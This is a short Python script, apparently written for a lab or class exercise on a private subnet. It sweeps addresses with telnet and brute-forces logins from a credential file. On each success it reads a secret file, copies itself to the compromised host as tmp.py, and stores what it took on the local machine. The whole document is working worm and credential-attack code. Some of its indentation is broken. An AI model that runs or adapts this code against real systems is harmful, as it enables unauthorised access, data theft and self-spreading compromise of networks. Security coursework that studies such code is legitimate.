import telnetlib
import paramiko
import os
import socket
import subprocess

cwd = os.getcwd()
users = []
ipAddresses = [24,88,90,102,120,163,196,204,240]

with open(os.path.join(cwd, "Q2pwd"), "r") as f:
    for line in f:
        lineArr = line.strip().split(" ")
        users.append(lineArr)
for i in range(0,256):
        ip_address = '172.16.48.' + str(i)
        print(ip_address)
        for user in users:
            username = user[0]
            password = user[1]
            try:
                tn = telnetlib.Telnet(ip_address, timeout=3)
                tn.read_until(b"login: ")
                tn.write(username.encode('ascii') + b"\n")                        
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")
                login_output = tn.read_until(b"$", 5).decode('ascii')
                if "$" in login_output:
                    print(f"Successfully logged in with username '{username}' and password '{password}'")
                    tn.write(b"ls\n")
                    tn.write(b"cat Q2secret\n")
                    output = tn.read_until(b"$ ", timeout=10).decode('ascii', 'ignore')
                    output1 = tn.read_until(b"$ ", timeout=10).decode('ascii', 'ignore')
                    output1 = output1.strip() + '\n'
                    with open('Q2wormtn.py', 'rb') as f:
                            tn.write(b'cat > tmp.py\n')
                            tn.write(f.read())
                            tn.write(b'\n')
                        tn.write(b"exit\n")
                        secrets = open("Q2secrets", 'a')
                        secrets.write(output1.strip('$'))
                        secrets.close()
                        break
                else:
                    print(f"Failed to login with username '{username}' and pass '{password}'")
                tn.close()
            except:
                print('username', end=' ')
                print(username, end=' ')
                print('failed')